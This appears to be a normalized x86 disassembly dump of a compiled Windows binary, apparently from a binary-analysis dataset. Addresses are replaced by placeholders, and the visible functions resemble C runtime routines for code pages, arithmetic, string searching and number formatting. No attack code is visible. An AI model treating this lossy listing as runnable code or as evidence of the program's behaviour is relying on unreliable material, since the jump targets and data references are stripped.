jl r-xdata
movzx eax [ rw-data ]
push eax
push esi
push esi
push edx
push esi
movzx eax [ rw-data ]
push esi
push eax
movzx eax [ rw-data ]
push eax
push edx
push ebx
jmp r-xdata
mov eax ebx
cmp edx ecx
jg r-xdata
xor eax eax
jmp r-xdata
cmp edx eax
jg r-xdata
movzx eax [ rw-data ]
push eax
push esi
push esi
push [ edi + 0x14 ]
push esi
movzx eax [ rw-data ]
push esi
push eax
movzx eax [ rw-data ]
push eax
push [ edi + 0x14 ]
push ebx
jmp r-xdata
movzx eax [ rw-data ]
push ebx
call sub_418cde
movzx eax [ rw-data ]
movzx ecx [ rw-data ]
add esp 0x24
cmp [ rw-data ] si
push eax
movzx eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
jne r-xdata
cmp edx eax
jle r-xdata
pop ebx
cmp edx ecx
jle r-xdata
movzx eax [ rw-data ]
push esi
call sub_418cde
add esp 0x24
jmp r-xdata
mov eax [ edi + 0x8 ]
imul eax eax 0x3c
add eax [ edi + 0x4 ]
imul eax eax 0x3c
add eax [ edi ]
imul eax eax 0x3e8
cmp edx ecx
jne r-xdata
cmp edx ecx
jge r-xdata
cmp edx eax
jge r-xdata
xor ecx ecx
cmp eax [ rw-data ]
setl cl
xor ecx ecx
cmp eax [ rw-data ]
setge cl
jmp r-xdata
mov eax ecx
jmp r-xdata
sub_419081
push 0x8
push r--data
call sub_4106dc
xor esi esi
cmp [ rw-data ] esi
jne r-xdata
call sub_410721
retn
push 0x6
call sub_4141fc
pop ecx
mov [ ebp - 0x4 ] esi
cmp [ rw-data ] esi
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4190c7
call sub_41899f
inc [ rw-data ]
sub_4190d0
push 0xc
push r--data
call sub_4106dc
push 0x6
call sub_4141fc
pop ecx
and [ ebp - 0x4 ] 0x0
mov edi [ ebp + 0x8 ]
call sub_418ed3
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_419108
mov eax [ ebp - 0x1c ]
call sub_410721
retn
sub_419120
push ebx
push edi
xor edi edi
mov eax [ esp + 0x10 ]
or eax eax
jge r-xdata
mov eax [ esp + 0x18 ]
or eax eax
jge r-xdata
inc edi
mov edx [ esp + 0xc ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x10 ] eax
mov [ esp + 0xc ] edx
or eax eax
jne r-xdata
mov edx [ esp + 0x14 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x18 ] eax
mov [ esp + 0x14 ] edx
mov ebx eax
mov ecx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
xor edx edx
div ecx
mov eax [ esp + 0xc ]
div ecx
mov eax edx
xor edx edx
dec edi
jns r-xdata
shr ebx 0x1
rcr ecx 0x1
shr edx 0x1
rcr eax 0x1
or ebx ebx
jne r-xdata
div ecx
mov ecx eax
mul [ esp + 0x18 ]
xchg ecx eax
mul [ esp + 0x14 ]
add edx ecx
jb r-xdata
neg edx
neg eax
sbb edx 0x0
jmp r-xdata
sub eax [ esp + 0x14 ]
sbb edx [ esp + 0x18 ]
cmp edx [ esp + 0x10 ]
ja r-xdata
pop edi
pop ebx
retn 0x10
jb r-xdata
sub eax [ esp + 0xc ]
sbb edx [ esp + 0x10 ]
dec edi
jns r-xdata
cmp eax [ esp + 0xc ]
jbe r-xdata
sub_4191d2
sub eax 0x3a4
je r-xdata
mov eax 0x411
retn
sub eax 0x4
je r-xdata
mov eax 0x804
retn
sub eax 0xd
je r-xdata
mov eax 0x412
retn
dec eax
je r-xdata
mov eax 0x404
retn
xor eax eax
retn
sub_419201
push ebx
push ebp
push esi
push edi
mov ebp 0x101
mov esi eax
push ebp
xor edi edi
lea ebx [ esi + 0x1c ]
push edi
push ebx
call sub_4109d0
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
xor eax eax
lea edi [ esi + 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
mov eax rw-data
add esp 0xc
sub eax esi
mov cl [ eax + ebx ]
mov [ ebx ] cl
inc ebx
dec ebp
jne r-xdata
lea ecx [ esi + 0x11d ]
mov esi 0x100
mov dl [ ecx + eax ]
mov [ ecx ] dl
inc ecx
dec esi
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
sub_419256
push ebp
lea ebp [ esp - 0x49c ]
sub esp 0x51c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x498 ] eax
push ebx
push edi
lea eax [ ebp - 0x7c ]
push eax
push [ esi + 0x4 ]
call [ GetCPInfo@IAT ]
test eax eax
mov edi 0x100
je r-xdata
lea eax [ esi + 0x11d ]
mov [ ebp - 0x80 ] 0xffffff9f
xor ecx ecx
sub [ ebp - 0x80 ] eax
xor eax eax
cmp edx 0x19
ja r-xdata
or [ esi + ecx + 0x1d ] 0x10
mov dl cl
add dl 0x20
jmp r-xdata
mov [ ebp + eax + 0x398 ] al
inc eax
cmp eax edi
jb r-xdata
mov al [ ebp - 0x76 ]
test al al
mov [ ebp + 0x398 ] 0x20
je r-xdata
mov [ eax ] 0x0
or [ esi + ecx + 0x1d ] 0x20
mov dl cl
sub dl 0x20
mov [ eax ] dl
jmp r-xdata
push 0x0
push [ esi + 0xc ]
lea eax [ ebp - 0x68 ]
push [ esi + 0x4 ]
push eax
push edi
lea eax [ ebp + 0x398 ]
push eax
push 0x1
push 0x0
call sub_41c7d9
xor ebx ebx
push ebx
push [ esi + 0x4 ]
lea eax [ ebp + 0x298 ]
push edi
push eax
push edi
lea eax [ ebp + 0x398 ]
push eax
push edi
push [ esi + 0xc ]
push ebx
call sub_41c5de
add esp 0x44
push ebx
push [ esi + 0x4 ]
lea eax [ ebp + 0x198 ]
push edi
push eax
push edi
lea eax [ ebp + 0x398 ]
push eax
push 0x200
push [ esi + 0xc ]
push ebx
call sub_41c5de
add esp 0x24
xor eax eax
lea ebx [ ebp - 0x75 ]
mov edx [ ebp - 0x80 ]
lea eax [ esi + ecx + 0x11d ]
add edx eax
lea ebx [ edx + 0x20 ]
cmp ebx 0x19
ja r-xdata
mov ecx [ ebp + 0x498 ]
pop edi
xor ecx ebp
pop ebx
call sub_40f589
add ebp 0x49c
leave
retn
inc ecx
cmp ecx edi
jb r-xdata
test cl 0x2
je r-xdata
or [ esi + eax + 0x1d ] 0x10
mov cl [ ebp + eax + 0x298 ]
jmp r-xdata
inc ebx
mov al [ ebx ]
inc ebx
test al al
jne r-xdata
sub eax ecx
inc eax
push eax
lea edx [ ebp + ecx + 0x398 ]
push 0x20
push edx
call sub_4109d0
add esp 0xc
mov [ esi + eax + 0x11d ] 0x0
or [ esi + eax + 0x1d ] 0x20
mov cl [ ebp + eax + 0x198 ]
mov [ esi + eax + 0x11d ] cl
jmp r-xdata
movzx ecx al
movzx eax [ ebx ]
cmp ecx eax
ja r-xdata
movzx ecx [ ebp + eax * 2 - 0x68 ]
test cl 0x1
je r-xdata
jmp r-xdata
inc eax
cmp eax edi
jb r-xdata
sub_4193e0
push 0xc
push r--data
call sub_4106dc
call sub_41576b
mov edi eax
mov eax [ rw-data ]
test [ edi + 0x70 ] eax
je r-xdata
push 0xd
call sub_4141fc
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ edi + 0x68 ]
mov [ ebp - 0x1c ] esi
cmp esi [ rw-data ]
je r-xdata
cmp [ edi + 0x6c ] 0x0
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41947b
jmp r-xdata
test esi esi
je r-xdata
mov esi [ edi + 0x68 ]
test esi esi
jne r-xdata
mov eax [ rw-data ]
mov [ edi + 0x68 ] eax
mov esi [ rw-data ]
mov [ ebp - 0x1c ] esi
push esi
call [ InterlockedIncrement@IAT ]
push esi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax esi
call sub_410721
retn
push 0x20
call sub_412f6d
pop ecx
cmp esi rw-data
je r-xdata
push esi
call sub_40f613
pop ecx
sub_419484
push ebp
mov ebp esp
sub esp 0x10
push ebx
xor ebx ebx
push ebx
lea ecx [ ebp - 0x10 ]
call sub_4110bb
cmp esi 0xfffffffe
mov [ rw-data ] ebx
jne r-xdata
cmp esi 0xfffffffd
jne r-xdata
mov [ rw-data ] 0x1
call [ GetOEMCP@IAT ]
cmp esi 0xfffffffc
jne r-xdata
mov [ rw-data ] 0x1
call [ GetACP@IAT ]
jmp r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x4 ]
mov [ rw-data ] 0x1
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax esi
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub_4194fe
push ebp
mov ebp esp
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
call sub_419484
mov edi eax
xor esi esi
cmp edi esi
mov [ ebp + 0x8 ] edi
jne r-xdata
mov [ ebp - 0x1c ] esi
xor eax eax
mov eax ebx
call sub_419201
push 0x101
lea eax [ ebx + 0x1c ]
push esi
push eax
call sub_4109d0
mov ecx [ ebp - 0x1c ]
add esp 0xc
imul ecx ecx 0x30
mov [ ebp - 0x20 ] esi
lea esi [ ecx + rw-data ]
mov [ ebp - 0x1c ] esi
jmp r-xdata
inc [ ebp - 0x1c ]
add eax 0x30
cmp eax 0xf0
jb r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40f589
leave
retn
cmp [ esi ] 0x0
jne r-xdata
cmp [ eax + rw-data ] edi
je r-xdata
lea eax [ ebp - 0x18 ]
push eax
push edi
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
mov al [ esi + 0x1 ]
test al al
je r-xdata
mov esi [ ebp - 0x1c ]
inc [ ebp - 0x20 ]
add esi 0x8
cmp [ ebp - 0x20 ] 0x4
mov [ ebp - 0x1c ] esi
jb r-xdata
cmp [ rw-data ] esi
jne r-xdata
push 0x101
lea eax [ ebx + 0x1c ]
push esi
push eax
call sub_4109d0
xor edx edx
inc edx
add esp 0xc
cmp [ ebp - 0x18 ] edx
mov [ ebx + 0x4 ] edi
mov [ ebx + 0xc ] esi
jbe r-xdata
movzx edi [ esi ]
movzx eax al
jmp r-xdata
mov eax edi
mov [ ebx + 0x4 ] edi
mov [ ebx + 0x8 ] 0x1
call sub_4191d2
push 0x6
mov [ ebx + 0xc ] eax
lea eax [ ebx + 0x10 ]
lea ecx [ ecx + rw-data ]
pop edx
or eax 0xffffffff
mov [ ebx + 0x8 ] esi
cmp [ ebp - 0x12 ] 0x0
je r-xdata
cmp edi eax
jbe r-xdata
mov si [ ecx ]
inc ecx
mov [ eax ] si
inc ecx
inc eax
inc eax
dec edx
jne r-xdata
mov esi ebx
call sub_419256
jmp r-xdata
lea eax [ ebx + 0x1e ]
mov ecx 0xfe
lea esi [ ebp - 0x11 ]
mov eax [ ebp - 0x20 ]
mov al [ eax + rw-data ]
or [ ebx + edi + 0x1d ] al
movzx eax [ esi + 0x1 ]
inc edi
mov edi [ ebp + 0x8 ]
inc esi
inc esi
xor eax eax
jmp r-xdata
or [ eax ] 0x8
inc eax
dec ecx
jne r-xdata
mov eax [ ebx + 0x4 ]
call sub_4191d2
mov [ ebx + 0xc ] eax
mov [ ebx + 0x8 ] edx
jmp r-xdata
movzx eax [ esi - 0x1 ]
movzx ecx cl
jmp r-xdata
xor eax eax
lea edi [ ebx + 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
cmp eax ecx
jbe r-xdata
or [ ebx + eax + 0x1d ] 0x4
inc eax
inc esi
inc esi
cmp [ esi - 0x1 ] 0x0
jne r-xdata
mov cl [ esi ]
test cl cl
je r-xdata
sub_4196a9
push 0x14
push r--data
call sub_4106dc
or [ ebp - 0x20 ] 0xffffffff
call sub_41576b
mov edi eax
mov [ ebp - 0x24 ] edi
call sub_4193e0
mov ebx [ edi + 0x68 ]
mov esi [ ebp + 0x8 ]
call sub_419484
mov [ ebp + 0x8 ] eax
cmp eax [ ebx + 0x4 ]
je r-xdata
and [ ebp - 0x20 ] 0x0
push 0x220
call sub_417499
pop ecx
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x20 ]
call sub_410721
retn
mov ecx 0x88
mov esi [ edi + 0x68 ]
mov edi ebx
[ edi ] [ esi ]
and [ ebx ] 0x0
push ebx
push [ ebp + 0x8 ]
call sub_4194fe
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
test eax eax
jne r-xdata
cmp eax 0xffffffff
jne r-xdata
mov esi [ ebp - 0x24 ]
push [ esi + 0x68 ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
cmp ebx rw-data
je r-xdata
mov [ esi + 0x68 ] ebx
push ebx
mov edi [ InterlockedIncrement@IAT ]
call edi
test [ esi + 0x70 ] 0x2
jne r-xdata
mov eax [ esi + 0x68 ]
cmp eax rw-data
je r-xdata
call sub_411077
mov [ eax ] 0x16
jmp r-xdata
push ebx
call sub_40f613
pop ecx
test [ rw-data ] 0x1
jne r-xdata
push eax
call sub_40f613
pop ecx
push 0xd
call sub_4141fc
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebx + 0x4 ]
mov [ rw-data ] eax
mov eax [ ebx + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebx + 0xc ]
mov [ rw-data ] eax
xor eax eax
xor eax eax
mov cx [ ebx + eax * 2 + 0x10 ]
mov [ eax * 2 + rw-data ] cx
inc eax
jmp r-xdata
xor eax eax
mov cl [ eax + ebx + 0x1c ]
mov [ eax + rw-data ] cl
inc eax
jmp r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x5
jge r-xdata
push [ rw-data ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov cl [ eax + ebx + 0x11d ]
mov [ eax + rw-data ] cl
inc eax
jmp r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x101
jge r-xdata
mov [ rw-data ] ebx
push ebx
call edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41980a
jmp r-xdata
mov eax [ rw-data ]
cmp eax rw-data
je r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x100
jge r-xdata
push eax
call sub_40f613
pop ecx
sub_419861
push ebx
push ebp
push esi
mov esi [ esp + 0x10 ]
mov eax [ esi + 0xbc ]
xor ebp ebp
cmp eax ebp
push edi
je r-xdata
mov eax [ esi + 0xc0 ]
cmp eax ebp
je r-xdata
cmp eax rw-data
je r-xdata
lea edi [ esi + 0xd4 ]
mov eax [ edi ]
cmp eax rw-data
je r-xdata
cmp [ eax ] ebp
jne r-xdata
mov eax [ esi + 0xb0 ]
cmp eax ebp
je r-xdata
push 0x6
lea edi [ esi + 0x50 ]
pop ebx
cmp [ eax + 0xb4 ] ebp
jne r-xdata
mov eax [ esi + 0xc4 ]
sub eax 0xfe
push eax
call sub_40f613
mov eax [ esi + 0xcc ]
mov edi 0x80
sub eax edi
push eax
call sub_40f613
mov eax [ esi + 0xd0 ]
sub eax edi
push eax
call sub_40f613
push [ esi + 0xc0 ]
call sub_40f613
add esp 0x10
cmp [ eax ] ebp
jne r-xdata
cmp [ edi - 0x4 ] ebp
je r-xdata
mov eax [ edi ]
cmp eax ebp
je r-xdata
push eax
call sub_41c819
push [ edi ]
call sub_40f613
pop ecx
pop ecx
mov eax [ esi + 0xb8 ]
cmp eax ebp
je r-xdata
add edi 0x10
dec ebx
jne r-xdata
mov eax [ edi + 0x4 ]
cmp eax ebp
je r-xdata
cmp [ eax ] ebp
jne r-xdata
mov eax [ esi + 0xb4 ]
cmp eax ebp
je r-xdata
cmp [ eax ] ebp
jne r-xdata
cmp [ edi - 0x8 ] rw-data
je r-xdata
push esi
call sub_40f613
pop ecx
pop edi
pop esi
pop ebp
pop ebx
retn
cmp [ eax ] ebp
jne r-xdata
push eax
call sub_40f613
pop ecx
push [ esi + 0xb0 ]
call sub_40f613
push [ esi + 0xbc ]
call sub_40f613
pop ecx
pop ecx
cmp [ eax ] ebp
jne r-xdata
push eax
call sub_40f613
push [ esi + 0xbc ]
call sub_41c9e9
pop ecx
pop ecx
push eax
call sub_40f613
pop ecx
push eax
call sub_40f613
push [ esi + 0xbc ]
call sub_41c9a9
pop ecx
pop ecx
sub_4199a1
push ebx
push ebp
push esi
mov esi [ esp + 0x10 ]
push edi
mov edi [ InterlockedIncrement@IAT ]
push esi
call edi
mov eax [ esi + 0xb0 ]
test eax eax
je r-xdata
mov eax [ esi + 0xb8 ]
test eax eax
je r-xdata
push eax
call edi
mov eax [ esi + 0xb4 ]
test eax eax
je r-xdata
push eax
call edi
mov eax [ esi + 0xc0 ]
test eax eax
je r-xdata
push eax
call edi
push 0x6
lea ebx [ esi + 0x50 ]
pop ebp
push eax
call edi
cmp [ ebx - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
add ebx 0x10
dec ebp
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
push eax
call edi
cmp [ ebx - 0x8 ] rw-data
je r-xdata
mov eax [ esi + 0xd4 ]
add eax 0xb4
push eax
call edi
pop edi
pop esi
pop ebp
pop ebx
retn
push eax
call edi
sub_419a27
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
mov eax esi
pop esi
retn
push ebx
push ebp
push edi
mov edi [ InterlockedDecrement@IAT ]
push esi
call edi
mov eax [ esi + 0xb0 ]
test eax eax
je r-xdata
mov eax [ esi + 0xb8 ]
test eax eax
je r-xdata
push eax
call edi
mov eax [ esi + 0xb4 ]
test eax eax
je r-xdata
push eax
call edi
mov eax [ esi + 0xc0 ]
test eax eax
je r-xdata
push eax
call edi
push 0x6
lea ebx [ esi + 0x50 ]
pop ebp
push eax
call edi
cmp [ ebx - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
add ebx 0x10
dec ebp
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
push eax
call edi
cmp [ ebx - 0x8 ] rw-data
je r-xdata
mov eax [ esi + 0xd4 ]
add eax 0xb4
push eax
call edi
pop edi
pop ebp
pop ebx
push eax
call edi
sub_419ab3
test edi edi
je r-xdata
xor eax eax
retn
test eax eax
je r-xdata
push esi
mov esi [ eax ]
cmp esi edi
je r-xdata
mov eax edi
pop esi
retn
push edi
mov [ eax ] edi
call sub_4199a1
test esi esi
pop ecx
je r-xdata
push esi
call sub_419a27
cmp [ esi ] 0x0
pop ecx
jne r-xdata
cmp esi rw-data
je r-xdata
push esi
call sub_419861
pop ecx
sub_419af1
push 0xc
push r--data
call sub_4106dc
call sub_41576b
mov esi eax
mov eax [ rw-data ]
test [ esi + 0x70 ] eax
je r-xdata
push 0xc
call sub_4141fc
pop ecx
and [ ebp - 0x4 ] 0x0
lea eax [ esi + 0x6c ]
mov edi [ rw-data ]
call sub_419ab3
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_419b5b
jmp r-xdata
cmp [ esi + 0x6c ] 0x0
je r-xdata
test esi esi
jne r-xdata
call sub_41576b
mov esi [ eax + 0x6c ]
mov eax esi
call sub_410721
retn
push 0x20
call sub_412f6d
pop ecx
sub_419b80
xor eax eax
mov al [ esp + 0x8 ]
push ebx
mov ebx eax
shl eax 0x8
mov edx [ esp + 0x8 ]
test edx 0x3
je r-xdata
or ebx eax
push edi
mov eax ebx
shl ebx 0x10
push esi
or ebx eax
mov cl [ edx ]
add edx 0x1
cmp cl bl
je r-xdata
mov eax [ edx - 0x4 ]
cmp al bl
je r-xdata
and eax 0x81010100
je r-xdata
lea eax [ edx - 0x1 ]
pop ebx
retn
test cl cl
je r-xdata
lea eax [ edx - 0x4 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
mov ecx [ edx ]
mov edi 0x7efefeff
mov eax ecx
mov esi edi
xor ecx ebx
add esi eax
add edi ecx
xor ecx 0xffffffff
xor eax 0xffffffff
xor ecx edi
xor eax esi
add edx 0x4
and ecx 0x81010100
jne r-xdata
and eax 0x1010100
jne r-xdata
pop ebx
xor eax eax
retn
test edx 0x3
jne r-xdata
pop esi
pop edi
cmp ah bl
je r-xdata
and esi 0x80000000
jne r-xdata
lea eax [ edx - 0x3 ]
pop esi
pop edi
pop ebx
retn
test ah ah
je r-xdata
shr eax 0x10
cmp al bl
je r-xdata
lea eax [ edx - 0x2 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
cmp ah bl
je r-xdata
pop esi
pop edi
lea eax [ edx - 0x1 ]
pop ebx
retn
test ah ah
je r-xdata
jmp r-xdata
sub_419c40
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
or ecx 0xffffffff
lea ecx [ ecx ]
add edx 0x1
bts [ esp ] eax
jmp r-xdata
mov eax ecx
add esp 0x20
pop esi
leave
retn
add esi 0x1
bt [ esp ] eax
jb r-xdata
mov al [ edx ]
or al al
je r-xdata
add ecx 0x1
mov al [ esi ]
or al al
je r-xdata
sub_419c90
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
or ecx 0xffffffff
lea ecx [ ecx ]
add edx 0x1
bts [ esp ] eax
jmp r-xdata
mov eax ecx
add esp 0x20
pop esi
leave
retn
add esi 0x1
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
add ecx 0x1
mov al [ esi ]
or al al
je r-xdata
sub_419cd6
push ebp
mov ebp esp
sub esp 0x10
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_4110bb
mov esi [ ebp + 0x8 ]
movsx eax [ esi ]
push eax
call sub_41cc4f
cmp eax 0x65
jmp r-xdata
pop ecx
jne r-xdata
inc esi
movzx eax [ esi ]
push eax
call sub_41cb0f
test eax eax
movsx eax [ esi ]
push eax
call sub_41cc4f
cmp eax 0x78
pop ecx
jne r-xdata
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
mov al [ esi ]
mov cl [ ecx ]
mov [ esi ] cl
inc esi
inc esi
inc esi
mov cl [ esi ]
mov [ esi ] al
mov al cl
mov cl [ esi ]
inc esi
test cl cl
jne r-xdata
cmp [ ebp - 0x4 ] cl
pop esi
je r-xdata
leave
retn
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub_419d47
push ebp
mov ebp esp
sub esp 0x10
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_4110bb
mov eax [ ebp + 0x8 ]
mov cl [ eax ]
test cl cl
mov esi [ ebp - 0x10 ]
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
je r-xdata
mov edx [ esi + 0xbc ]
mov edx [ edx ]
mov dl [ edx ]
cmp [ ebp - 0x4 ] 0x0
pop esi
je r-xdata
jmp r-xdata
inc eax
mov cl [ eax ]
test cl cl
jne r-xdata
leave
retn
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
mov cl [ eax ]
test cl cl
jne r-xdata
cmp cl dl
je r-xdata
cmp cl 0x65
je r-xdata
mov edx eax
cmp cl 0x45
je r-xdata
dec eax
cmp [ eax ] 0x30
je r-xdata
mov ecx [ esi + 0xbc ]
mov ecx [ ecx ]
push ebx
mov bl [ eax ]
cmp bl [ ecx ]
pop ebx
jne r-xdata
inc eax
mov cl [ edx ]
inc eax
inc edx
test cl cl
mov [ eax ] cl
jne r-xdata
dec eax
sub_419ddd
push ebp
mov ebp esp
push ecx
push ecx
cmp [ ebp + 0x8 ] 0x0
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
je r-xdata
lea eax [ ebp + 0x8 ]
push eax
call sub_41cd1c
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
lea eax [ ebp - 0x8 ]
push eax
call sub_41cc76
mov ecx [ ebp - 0x8 ]
mov eax [ ebp + 0xc ]
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
add esp 0xc
leave
retn
sub_419e34
test edi edi
push esi
mov esi eax
je r-xdata
pop esi
retn
push esi
call sub_4108e0
inc eax
push eax
push esi
add esi edi
push esi
call sub_418250
add esp 0x10
sub_419e6d
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0x10 ]
mov ebx eax
call sub_4110bb
xor esi esi
cmp ebx esi
jne r-xdata
cmp [ ebp + 0x8 ] esi
jbe r-xdata
call sub_411077
push 0x16
cmp [ ebp + 0xc ] esi
jle r-xdata
mov eax edi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
xor eax eax
mov eax [ ebp + 0xc ]
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebp + 0x18 ] 0x0
je r-xdata
call sub_411077
push 0x22
jmp r-xdata
add eax 0x9
cmp [ ebp + 0x8 ] eax
ja r-xdata
mov edi [ ebp + 0x14 ]
cmp [ edi ] 0x2d
mov esi ebx
jne r-xdata
mov edx [ ebp + 0x14 ]
xor eax eax
cmp [ ebp + 0xc ] esi
setg al
xor ecx ecx
cmp [ edx ] 0x2d
sete cl
mov edi eax
add ecx ebx
mov eax ecx
call sub_419e34
pop edi
push esi
push esi
push esi
push esi
push esi
mov [ eax ] edi
call sub_413fad
add esp 0x14
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0xc ] 0x0
jle r-xdata
mov [ ebx ] 0x2d
lea esi [ ebx + 0x1 ]
xor eax eax
cmp [ ebp + 0x18 ] al
sete al
add eax [ ebp + 0xc ]
add esi eax
cmp [ ebp + 0x8 ] 0xffffffff
jne r-xdata
lea eax [ esi + 0x1 ]
mov cl [ eax ]
mov [ esi ] cl
mov esi eax
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0xbc ]
mov eax [ eax ]
mov al [ eax ]
mov [ esi ] al
sub ebx esi
add ebx [ ebp + 0x8 ]
or ebx 0xffffffff
jmp r-xdata
cmp [ ebp + 0x10 ] ebx
lea ecx [ esi + 0x2 ]
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_413eb1
add esp 0x14
push r--data
push ebx
push esi
call sub_410677
add esp 0xc
xor ebx ebx
test eax eax
je r-xdata
mov eax [ edi + 0xc ]
inc esi
cmp [ eax ] 0x30
je r-xdata
mov [ esi ] 0x45
test [ rw-data ] 0x1
je r-xdata
mov eax [ edi + 0x4 ]
dec eax
jns r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ecx ] 0x30
jne r-xdata
inc esi
cmp eax 0x64
jl r-xdata
neg eax
mov [ esi ] 0x2d
xor eax eax
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
push 0x3
lea eax [ ecx + 0x1 ]
push eax
push ecx
call sub_418250
add esp 0xc
inc esi
cmp eax 0xa
jl r-xdata
cdq
push 0x64
pop edi
idiv edi
add [ esi ] al
mov eax edx
add [ esi + 0x1 ] al
cdq
push 0xa
pop edi
idiv edi
add [ esi ] al
mov eax edx
sub_419fda
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
push 0x16
pop esi
push esi
lea ecx [ ebp - 0x1c ]
push ecx
lea ecx [ ebp - 0x2c ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
call sub_41cf3a
xor ebx ebx
add esp 0x14
cmp edi ebx
jne r-xdata
mov eax [ ebp + 0x10 ]
cmp eax ebx
jbe r-xdata
call sub_411077
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_413fad
add esp 0x14
mov eax esi
jmp r-xdata
cmp eax 0xffffffff
mov esi [ ebp + 0x14 ]
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40f589
leave
retn
xor ecx ecx
cmp [ ebp - 0x2c ] 0x2d
sete cl
sub eax ecx
xor ecx ecx
cmp esi ebx
setg cl
sub eax ecx
or eax 0xffffffff
jmp r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x2c ]
push ebx
push eax
push [ ebp + 0x18 ]
mov eax edi
push esi
push [ ebp + 0x10 ]
call sub_419e6d
add esp 0x18
mov [ edi ] bl
jmp r-xdata
lea ecx [ ebp - 0x2c ]
push ecx
lea ecx [ esi + 0x1 ]
push ecx
push eax
xor eax eax
cmp [ ebp - 0x2c ] 0x2d
sete al
xor ecx ecx
cmp esi ebx
setg cl
add eax edi
add ecx eax
push ecx
call sub_41cdc2
add esp 0x10
cmp eax ebx
je r-xdata
sub_41a0c6
push ebp
mov ebp esp
sub esp 0x24
push esi
push edi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0x24 ]
mov [ ebp - 0x14 ] 0x3ff
xor edi edi
mov [ ebp - 0x4 ] 0x30
